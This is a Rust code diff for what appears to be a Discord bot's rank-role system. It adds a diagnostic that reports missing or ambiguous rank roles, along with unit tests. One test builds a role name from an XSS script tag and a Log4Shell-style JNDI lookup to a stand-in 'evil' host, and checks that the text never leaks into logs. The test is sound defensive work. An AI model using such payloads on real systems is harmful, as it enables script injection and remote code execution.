@@ -14,7 +14,8 @@
 //! - tick cadences ([`LIVE_COUNTER_INTERVAL_MS`], [`RANK_SNAPSHOT_INTERVAL_MS`])
 //! - the Prospect → Legend ladder ([`RankKey`])
 //! - raid-window grounding data ([`RAID_ANOMALIES`], [`window_bounds`])
-//! - rank-role matching ([`match_rank_roles`])
+//! - rank-role matching ([`match_rank_roles`]) and its per-rung diagnostic
+//!   ([`diagnose_rank_roles`])
 //! - one-pass snapshot arithmetic ([`build_community_snapshot`])
 //! - the non-cumulative self-heal plan ([`plan_rank_heal`]): missing lower
 //!   rungs per member, granted by the rank tick before it publishes
@@ -200,6 +201,55 @@ pub struct RankRole {
 pub struct RaidWindow {
     pub id: String,
     pub excluded_member_ids: HashSet<String>,
+}
+
+/// Why one ladder rung cannot be resolved to a single guild role.
+///
+/// The diagnostic never carries a Discord role name or id: it names the rung
+/// by its fixed [`RankKey::label`] plus the outcome and the (uncapped) match
+/// count, so a moderator rename cannot inject text into logs.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum RankRungProblem {
+    /// No guild role matches this rung label.
+    Missing,
+    /// More than one guild role matches this rung label.
+    Ambiguous {
+        /// Raw number of matching guild roles (the tick caps this for logs).
+        matches: usize,
+    },
+}
+
+/// One rung [`match_rank_roles`] could not resolve, in ladder order.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct RankRungFailure {
+    pub key: RankKey,
+    pub problem: RankRungProblem,
+}
+
+/// Report every failing rung in ladder order: `Missing` when no guild role
+/// matches the rung label, `Ambiguous` when more than one does (matching is
+/// trimmed and case-insensitive, like [`match_rank_roles`]). Returns an empty
+/// vector when the ladder resolves. Pure; allocates only the returned
+/// failures. Carries no Discord names or ids.
+#[must_use]
+pub fn diagnose_rank_roles(roles: &[(String, String)]) -> Vec<RankRungFailure> {
+    let mut out = Vec::new();
+    for key in RankKey::ALL {
+        let count = roles
+            .iter()
+            .filter(|(_, name)| name.trim().eq_ignore_ascii_case(key.label()))
+            .count();
+        if count == 1 {
+            continue;
+        }
+        let problem = if count == 0 {
+            RankRungProblem::Missing
+        } else {
+            RankRungProblem::Ambiguous { matches: count }
+        };
+        out.push(RankRungFailure { key, problem });
+    }
+    out
 }
 
 /// Match the five rank roles by name, case-insensitive (legacy
@@ -624,6 +674,108 @@ mod tests {
         assert!(match_rank_roles(&dup).is_none());
         // Empty guild → unusable.
         assert!(match_rank_roles(&[]).is_none());
+    }
+
+    #[test]
+    fn diagnose_reports_missing_and_ambiguous_rungs_in_ladder_order() {
+        fn roles_for(names: &[&str]) -> Vec<(String, String)> {
+            names
+                .iter()
+                .enumerate()
+                .map(|(i, name)| (format!("role-{i}"), (*name).to_owned()))
+                .collect()
+        }
+
+        // All five rungs present resolves with no failures.
+        let full = roles_for(&["Prospect", "Member", "Soldier", "Veteran", "Legend"]);
+        assert!(diagnose_rank_roles(&full).is_empty());
+        assert!(match_rank_roles(&full).is_some());
+
+        // Each rung missing alone reports exactly that rung as Missing.
+        for missing in RankKey::ALL {
+            let names: Vec<&str> = RankKey::ALL
+                .into_iter()
+                .filter(|k| *k != missing)
+                .map(|k| k.label())
+                .collect();
+            let failures = diagnose_rank_roles(&roles_for(&names));
+            assert_eq!(
+                failures,
+                vec![RankRungFailure {
+                    key: missing,
+                    problem: RankRungProblem::Missing,
+                }],
+                "missing {missing:?}"
+            );
+            assert!(match_rank_roles(&roles_for(&names)).is_none());
+        }
+
+        // A duplicate (case-insensitive, trimmed) reports Ambiguous with count.
+        let dup = roles_for(&[
+            "Prospect",
+            "  member ",
+            "MEMBER",
+            "Soldier",
+            "Veteran",
+            "Legend",
+        ]);
+        assert_eq!(
+            diagnose_rank_roles(&dup),
+            vec![RankRungFailure {
+                key: RankKey::Member,
+                problem: RankRungProblem::Ambiguous { matches: 2 },
+            }]
+        );
+        assert!(match_rank_roles(&dup).is_none());
+
+        // Several failing rungs are all reported in ladder order.
+        let mixed = roles_for(&[
+            "Prospect", "Member", "Member", "Veteran", "Veteran", "Veteran",
+        ]);
+        assert_eq!(
+            diagnose_rank_roles(&mixed),
+            vec![
+                RankRungFailure {
+                    key: RankKey::Member,
+                    problem: RankRungProblem::Ambiguous { matches: 2 },
+                },
+                RankRungFailure {
+                    key: RankKey::Soldier,
+                    problem: RankRungProblem::Missing,
+                },
+                RankRungFailure {
+                    key: RankKey::Veteran,
+                    problem: RankRungProblem::Ambiguous { matches: 3 },
+                },
+                RankRungFailure {
+                    key: RankKey::Legend,
+                    problem: RankRungProblem::Missing,
+                },
+            ]
+        );
+
+        // Injection text in a role name never reaches the diagnostic: the
+        // failure names only the fixed rung label, never the role text.
+        let injection_name = "<script>alert('x')</script> ${jndi:ldap://evil}";
+        let injection = vec![
+            ("role-1".to_owned(), "Prospect".to_owned()),
+            ("role-2".to_owned(), "Member".to_owned()),
+            ("role-3".to_owned(), "Soldier".to_owned()),
+            ("role-4".to_owned(), "Veteran".to_owned()),
+            ("role-evil".to_owned(), injection_name.to_owned()),
+        ];
+        let failures = diagnose_rank_roles(&injection);
+        assert_eq!(
+            failures,
+            vec![RankRungFailure {
+                key: RankKey::Legend,
+                problem: RankRungProblem::Missing,
+            }]
+        );
+        let debug = format!("{failures:?}");
+        assert!(debug.contains("Legend"));
+        assert!(!debug.contains(injection_name));
+        assert!(!debug.contains("role-evil"));
     }
 
     #[test]
